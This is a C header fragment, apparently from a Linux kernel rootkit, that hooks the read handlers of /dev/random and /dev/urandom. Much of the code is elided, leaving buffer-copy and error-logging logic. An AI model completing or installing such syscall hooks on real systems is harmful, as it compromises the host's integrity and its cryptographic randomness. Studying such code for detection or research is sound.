#ifndef HOOK_RANDOM_H
#define HOOK_RANDOM_H
...
static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
    ...
    if (error)
    {
        info("%ld bytes could not be copied into kbuf\n", error);
        kfree(kbuf);
        return bytes_read;
    }
    ...
    if (error)
        info("%ld bytes could not be copied back into buf\n", error);
...
static asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
    ...
    if (error)
    {
        info("rootkit: %ld bytes could not be copied into kbuf\n", error);
        kfree(kbuf);
        return bytes_read;
    }
    ...
    error = copy_to_user(buf, kbuf, bytes_read);
    if (error)
        info("%ld bytes could not be copied into buf\n", error);
